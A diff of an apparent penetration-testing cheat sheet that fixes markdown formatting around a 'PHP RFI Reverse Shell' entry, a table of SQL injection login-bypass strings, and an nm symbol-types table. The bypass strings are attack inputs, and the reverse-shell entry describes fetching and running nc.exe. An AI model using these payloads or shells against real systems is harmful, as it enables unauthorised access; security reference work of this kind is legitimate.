@@ -977,7 +977,7 @@ done
 fi</p></td>
 ```
 
-<span id="anchor-108"></span>PHP RFI Reverse Shell</span>
+<span id="anchor-108"></span>PHP RFI Reverse Shell
 
 This can be used in a RFI/LFI to download nc.exe from the specified
 server then run it.
@@ -1022,7 +1022,7 @@ could lead to type juggling.
 | 'or'-      | 'or-       | or a=a      | 'or a=a     | "or a=a     | or a=a-      |
 | 'or a=a-   | "or a=a-   | or 'a'='a'  | 'or 'a'='a' | "or 'a'='a' | ')or('a'='a' |
 | ")"a"="a"  | ')'a'='a   | 'or"='      | ' or 1=1--  | " or 1=1--  | or 1=1--     |
-| " or 1=1\# |            |             |             |             |             
+| " or 1=1\# |            |             |             |             |              |
 
 <span id="anchor-114"></span>SQL Comment Formats
 
@@ -2598,7 +2598,6 @@ nm -S **&lt;ELF File&gt;**
 
 <span id="anchor-366"></span>Command Symbol Types
 
-|                 |                                         |
 |-----------------|-----------------------------------------|
 | **Symbol Type** | **Meaning**                             |
 | A               | Absolute Symbol                         |
@@ -2606,8 +2605,7 @@ nm -S **&lt;ELF File&gt;**
 | D               | In the Initialized Data Section         |
 | N               | Debugging Symbol                        |
 | T               | In the Text Section                     |
-| U               | Symbol Undefined                       
-```
+| U               | Symbol Undefined                        |
 
 <span id="anchor-367"></span>Strace
 
